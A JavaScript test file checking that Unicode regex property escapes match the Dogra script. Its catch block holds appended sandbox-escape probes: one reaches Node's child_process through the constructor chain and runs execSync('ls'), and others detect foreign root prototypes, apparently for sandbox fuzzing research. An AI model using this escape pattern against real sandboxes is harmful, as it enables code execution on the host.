try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [[
                71680,
                71739
            ]]
    });
    testPropertyEscapes(/^\p{Script=Dogra}+$/u, matchSymbols, '\\p{Script=Dogra}');
    testPropertyEscapes(/^\p{Script=Dogr}+$/u, matchSymbols, '\\p{Script=Dogr}');
    testPropertyEscapes(/^\p{sc=Dogra}+$/u, matchSymbols, '\\p{sc=Dogra}');
    testPropertyEscapes(/^\p{sc=Dogr}+$/u, matchSymbols, '\\p{sc=Dogr}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                71679
            ],
            [
                71740,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Dogra}+$/u, nonMatchSymbols, '\\P{Script=Dogra}');
    testPropertyEscapes(/^\P{Script=Dogr}+$/u, nonMatchSymbols, '\\P{Script=Dogr}');
    testPropertyEscapes(/^\P{sc=Dogra}+$/u, nonMatchSymbols, '\\P{sc=Dogra}');
    testPropertyEscapes(/^\P{sc=Dogr}+$/u, nonMatchSymbols, '\\P{sc=Dogr}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}